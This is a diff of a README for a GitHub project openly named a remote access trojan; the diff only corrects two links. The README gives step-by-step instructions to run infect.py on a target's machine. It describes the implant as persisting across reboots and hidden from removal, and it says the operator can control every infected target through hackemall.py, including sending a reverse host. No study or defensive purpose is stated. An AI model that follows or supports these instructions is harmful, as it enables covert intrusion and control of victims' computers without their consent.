@@ -18,11 +18,11 @@ To install this tool, you will need to follow this steps :
 - Next, install the flask server on this machine :
   - See [this](https://github.com/fxndone/Online-Flask-Remote-Access-Trojan/blob/main/server/README.md) README file and folow the instructions on your server.
 - Then, you'll need to infect targets !
-  - To do this, get the [infect.py](https://github.com/fxndone/Online-Flask-Remote-Access-Trojan/blob/main/server/infect.py) (you can change the name (not the extension (or to .pyw) !), and/or compile it using PyInstaller, cx_freeze...) script and execute it on target's machine.
+  - To do this, get the [infect.py](https://github.com/fxndone/Online-Flask-Remote-Access-Trojan/blob/main/infect.py) (you can change the name (not the extension (or to .pyw) !), and/or compile it using PyInstaller, cx_freeze...) script and execute it on target's machine.
   - Once a target opened this script, it is "permanent" :
     - Every time the target reboot, the script restart
     - It's hidden on target system, so removing it, is hard
-    - You can remove it by executing [deletme.py](https://fxndone/Online-Flask-Remote-Access-Trojan/blob/main/deletme.py) on target system.
+    - You can remove it by executing [deletme.py](https://github.com/fxndone/Online-Flask-Remote-Access-Trojan/blob/main/deletme.py) on target system.
   - Once a target has been infected, it should apear as present on the main system (it will be explained later).
 - Once you infected targets, you will be able to control them :
   - Using the script [hackemall.py](https://github.com/fxndone/Online-Flask-Remote-Access-Trojan/blob/main/hackemall.py), you will be able to see all targets, and send them a reverse host.
